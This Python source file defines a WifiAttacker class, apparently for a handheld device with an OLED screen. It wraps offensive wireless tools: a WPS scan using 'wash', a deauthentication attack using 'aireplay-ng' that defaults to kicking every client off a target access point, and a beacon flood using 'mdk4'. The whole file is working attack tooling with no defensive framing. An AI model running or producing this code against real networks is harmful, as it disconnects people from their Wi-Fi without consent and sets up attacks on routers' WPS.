from core.event_bus import EventBus
from core.logger import get_logger

import subprocess
import time
import os
import signal

log = get_logger("wifi.attacker")
bus = EventBus()


class WifiAttacker:

    def __init__(self, interface="wlan1"):
        self.interface = interface

    # ─────────────────────────────────────────
    # WPS SCAN
    # ─────────────────────────────────────────

    def wps_scan(self) -> list:

        log.info(f"Iniciando WPS scan en {self.interface}")

        bus.publish_sync(
            "oled:wifi_status",
            {"msg": "Escaneando WPS..."}
        )

        redes = {}

        try:

            proc = subprocess.Popen(
                [
                    "sudo",
                    "wash",
                    "-i",
                    self.interface,
                    "--scan",
                    "-s",
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                preexec_fn=os.setsid,
            )

            start_time = time.time()
            timeout = 45

            while time.time() - start_time < timeout:

                line = proc.stdout.readline()

                if not line and proc.poll() is not None:
                    break

                parts = line.strip().split()

                if (
                    len(parts) >= 6
                    and ":" in parts[0]
                    and parts[0] != "BSSID"
                ):

                    bssid = parts[0]

                    redes[bssid] = {
                        "bssid": bssid,
                        "channel": parts[1],
                        "rssi": parts[2],
                        "wps_ver": parts[3],
                        "locked": "Yes" in parts[4],
                        "ssid": " ".join(parts[5:])
                        if len(parts) > 5
                        else "Unknown",
                    }

            try:
                os.killpg(
                    os.getpgid(proc.pid),
                    signal.SIGTERM
                )
            except ProcessLookupError:
                pass

            lista_redes = list(redes.values())

            log.info(
                f"WPS scan completo: {len(lista_redes)} redes"
            )

            bus.publish_sync(
                "oled:wifi_status",
                {
                    "msg": f"WPS: {len(lista_redes)} redes"
                }
            )

            bus.publish_sync(
                "wifi.wps_scan_done",
                {"redes": lista_redes}
            )

            bus.publish_sync(
                "oled:return_menu",
                {}
            )

            return lista_redes

        except Exception as e:

            log.error(f"WPS scan error: {e}")

            bus.publish_sync(
                "oled:wifi_status",
                {"msg": "Error WPS"}
            )

            bus.publish_sync(
                "oled:return_menu",
                {}
            )

            return []

    # ─────────────────────────────────────────
    # DEAUTH
    # ─────────────────────────────────────────

    def deauth(
        self,
        bssid: str,
        client: str = "FF:FF:FF:FF:FF:FF",
        count: int = 10,
    ):

        log.warning(
            f"Deauth → AP:{bssid} Cliente:{client}"
        )

        bus.publish_sync(
            "oled:wifi_status",
            {"msg": "Enviando Deauth"}
        )

        try:

            result = subprocess.run(
                [
                    "sudo",
                    "aireplay-ng",
                    "--deauth",
                    str(count),
                    "-a",
                    bssid,
                    "-c",
                    client,
                    self.interface,
                ],
                capture_output=True,
                text=True,
                timeout=30,
            )

            success = result.returncode == 0

            bus.publish_sync(
                "wifi.deauth_sent",
                {
                    "bssid": bssid,
                    "client": client,
                    "count": count,
                    "success": success,
                },
            )

            if success:

                bus.publish_sync(
                    "oled:wifi_status",
                    {"msg": "Deauth OK"}
                )

            else:

                bus.publish_sync(
                    "oled:wifi_status",
                    {"msg": "Deauth fallo"}
                )

            return success

        except Exception as e:

            log.error(f"Deauth error: {e}")

            bus.publish_sync(
                "oled:wifi_status",
                {"msg": "Error Deauth"}
            )

            return False

        finally:

            bus.publish_sync(
                "oled:return_menu",
                {}
            )

    # ─────────────────────────────────────────
    # BEACON FLOOD
    # ─────────────────────────────────────────

    def beacon_flood(self, ssid: str):

        log.warning(
            f"Beacon flood → SSID:{ssid}"
        )

        bus.publish_sync(
            "oled:wifi_status",
            {"msg": "Beacon Flood..."}
        )

        try:

            with open(
                "/tmp/ssid_list.txt",
                "w"
            ) as f:
                f.write(f"{ssid}\n")

            result = subprocess.run(
                [
                    "sudo",
                    "mdk4",
                    self.interface,
                    "b",
                    "-f",
                    "/tmp/ssid_list.txt",
                    "-c",
                    "6",
                ],
                capture_output=True,
                text=True,
                timeout=15,
            )

            success = result.returncode == 0

            bus.publish_sync(
                "wifi.beacon_flood_sent",
                {
                    "ssid": ssid,
                    "success": success,
                },
            )

            if success:

                bus.publish_sync(
                    "oled:wifi_status",
                    {"msg": "Beacon OK"}
                )

            else:

                bus.publish_sync(
                    "oled:wifi_status",
                    {"msg": "Beacon fallo"}
                )

            return success

        except FileNotFoundError:

            log.error(
                "mdk4 no instalado"
            )

            bus.publish_sync(
                "oled:wifi_status",
                {"msg": "mdk4 missing"}
            )

            return False

        except Exception as e:

            log.error(f"Beacon error: {e}")

            bus.publish_sync(
                "oled:wifi_status",
                {"msg": "Error Beacon"}
            )

            return False

        finally:

            bus.publish_sync(
                "oled:return_menu",
                {}
            )